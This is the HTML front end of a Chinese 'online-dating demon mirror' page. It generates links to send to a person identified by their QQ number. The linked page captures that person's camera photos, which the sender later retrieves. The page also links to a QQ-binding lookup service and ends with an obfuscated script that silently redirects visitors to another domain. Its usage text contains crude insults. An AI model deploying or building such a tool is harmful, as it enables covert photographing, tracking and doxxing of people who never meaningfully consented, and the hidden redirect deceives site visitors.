
<!DOCTYPE html>
<html lang="zh-CN">
  <head>
   <style>
	body {
	     		background: url(/images/luzuz.jpg;) no-repeat center center fixed;
                background-size: cover;
	}
	</style>
      
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>网恋照妖镜</title>
    <!--baidu-->
    <!-- Bootstrap -->
    <link href="http://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.css" rel="stylesheet">
    <script src></script>
   
	<script src="http://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
	<script src="http://cdn.bootcss.com/layer/3.0.3/layer.min.js"></script>
	<link rel="stylesheet" type="text/css" href="css/shop_style.css">
	<link href="css/shop.css" rel="stylesheet" type="text/css">
	<link href="css/style.css" rel="stylesheet" type="text/css">
	<script src="js/jquery.min.js"></script>
	<link rel="shortcut icon" href="http://www.ym53.cn/f" type="image/x-icon">
	<script src="http://lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
    <style> 
        #M1{
        	width: 110px;
    height: 35px;
    padding-top: 2px\9;
    /* cursor: pointer; */
    color: #fff;
    font-size: 15px;
    /* letter-spacing: 1px; */
    background: #3385ff;
    /* border-bottom: 1px solid #2d78f4; */
    /* outline: medium; */
    *: ;
    border-bottom: none;
    -webkit-appearance: none;
    -webkit-border-radius: 0;
    border: 0;
        text-align: center;
    text-decoration:none;
    color: #fff;
    background-color: #007bff;
    border-color: #007bff;
        padding: 7px;
        float: left;
        margin-left: 2%;     
        margin-top: 2%;
        }
</style> 
    
<script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){
        alert("ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'https://www.youxuanma.cn/?id='+myid.value+'&url='+url.value; //修改此处的域名 必须要SSL证书    kd.style = ''; 
    kd.innerText = 'https://www.youxuanma.cn/?id='+myid.value+'&url='+url.value; 
}
</script>
<div id="bob">


	<div id="bd">
<div class="ct" style="padding:0;">
<section class="index">
<div id="bds">
	<div id="content">
	<div class="hd">
	
	<a href="https://您的域名/"><img src="images/luyuz.png"></div></a>
	<div class="mall" id="contentss">

<div class="mianban">
    <div class="wrap">
        <div class="tabs">
			<a href="javascript:void(0)" id="Choice_one" onclick="Choice(1)" class="active">链接生成</a>
			<a href="javascript:void(0)" id="Choice_two" onclick="Choice(2)">其他工具</a>
			<a href="javascript:void(0)" id="Choice_Three" onclick="Choice(3)">关于</a>            
        </div>
        <div class="swiper-container">
            <div class="content-slide">
                <div class="purchase_from">
					<ul id="Open" style="display:block;">
						<form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
						<li>
						<input type="text" class="form-control" id="myid" placeholder="输入对方QQ，生成链接" value>
                        <p>拍摄后跳转到：</p>
                        <input type="text" class="form-control" id="url" value="http://qq.com">
						</li>
						<li>
						<input type="button" value="生成链接" onclick="create();" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;"> <br>   
						</li>
						<li class="btn_purchase">
                            <input type="button" value="查看照片" onclick="window.location.href='ck.php?id='+document.getElementById('myid').value" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;">
                        </li>
						<div class="alert alert-success">
                        <img src="images/ico_success.png">
						<a id="kd" style="pointer-events: none;">请先生成链接！</a>
						</div>
						<span id="Order"></span>
						</form>
                    </ul>
                    <ul id="query" style="display: none;">
                        <form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
                        <li class="btn_purchase">
						
					
    <a href="http://apiqq.i0x0.cn/dh/" id="M1" style="background-color: rgb(0, 153, 204);">免费查Q绑</a>
    <a href="https://jq.qq.com/?_wv=1027&k=gLRs9zYk" id="M1" style="background-color: rgb(0, 153, 204);">点击加入群聊</a>
                    
                        </li>
						  
                        <span id="Orderd"></span>
						</form>
                    </ul>
                    <ul id="Back" style="display:none;">
                        <center>
						<h4 class="hd_tit" style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">本站温馨提示<br>
						<span style="font-size:13px;color:red;">注意：使用使用对方QQ生成链接!</span>
						</h4>

						</center>
						<div class="list-group-item text-center">
					   <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
                       <p>2.懒得做数据库，QQ是查看照片的凭证，不要泄露给知道这个平台的人</p>
                       <p>3.为节省服务器资源，不定期删除7天前的数据</p>  
						</div>
                        <span id="Order"></span>
                    </ul>
                </div>
            </div>
        </div>
        <div class="gnbt">网恋照妖镜功能简介</div>
			<div class="bd">
				<div class="bc">
				   <textarea readonly="true" name="notice" id cols="30" rows="15" style="max-width: 100%;width:100%">                   ★作者声明★  
①本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许
②懒得做数据库,QQ是查看照片的凭证,不要泄露给知道这个平台的人  
③如有侵权、肖像权等,请联系本站下方邮箱删除！
                   ★使用说明★  
①填写对方QQ方便日后查询!填写完成后不用管直接点击生成!  
②生成完成后,复制链接发给你要查询的人  
③他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！  
④我再说一遍,填写要么数字要么QQ,小学生滚,写你妈逼英文和中文呢？  
⑤由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行  
仅供娱乐使用,请勿用于非法商业用途,否则后果自负！  
请收藏本站,以防丢失 </textarea>
				</div>
			</div>
			<div class="ft">网恋照妖镜</div>
    	</div>
    	
    	                <p>常用链接:</p>
               <div width="100px" height="100px" style=" margin: 10px auto; border: 1px solid #ccc; text-align: center">
               	
               	<a href="http://apiqq.i0x0.cn/dh/" id="M1" style="background-color: #af00ff;">免费查绑</a> 
                 	<a href="https://www.youxuanma.cn/" id="M1" style="background-color: #af00ff;">源码下载第一选择-优选源码库</a>
                 <a href="http://www.wcxga.cn/" id="M1" style="background-color: #af00ff;">微胖课堂-网赚必选</a>
                     <a href="http://www.zwxmk.cn/" id="M1" style="background-color: #af00ff;">小唯资源</a>
                 		
               	</div>
    	
    </div>
    <p style="text-align:center"><br><a style="color: #FFFFFF"></a></p><br>
</div>
<div id="loading"></div>
	</div>
	</div>
	</section></div>
	</div>
	<div style="clear:both;"></div>

<p style="text-align:center"><br><a style="color: #FFFFFF">Copyright ©2021Powered By:优选源码库!</a></p><br>
<script type="text/javascript" src="js/main.js"></script>

<script>
$(document).ready(function(){
	getqrpic();
});
<script type="text/javascript">
var a = 'retrtrfdcfvvvv';
var ym = window.location;
var ym2 = 'www.ovdh.cn';
var ym3 = String(ym);

function suan(a){
var re = a.substring(0,2);
var tr = a.substring(2,4);
var tr2 = a.substring(4,6);
var fd = a.substring(6,8);
var cf = a.substring(8,10);
var vv = a.substring(10,12);
var vv2 = a.substring(12,14);
re = 'h';
tr = 't';
tr2 ='t';
fd = 'p';
cf = ':';
vv = '/';
vv2 = '/';
var p = re+tr+tr2+fd+cf+vv+vv2;
return p;
}
if (ym3.indexOf(ym2) == -1 ) {
alert(ym2);
// var av = ym3;
var b = suan(a) + 'ovdh.cn' + '/';
window.location = b;
}
</script>

<script language="Javascript">
document.oncontextmenu=new Function("event.returnValue=false");
document.onselectstart=new Function("event.returnValue=false");
</script>
</script>
		<script src="js/index.js"></script><!-- 核心插件 -->
		<script src="js/all.js"></script><!-- 图标库 -->
		<script src="js/Sitetime.js"></script><!-- 运行时间 -->
		<script src="js/Mouse.js"></script><!-- 点击烟花特效 --
	 --></div></body></html>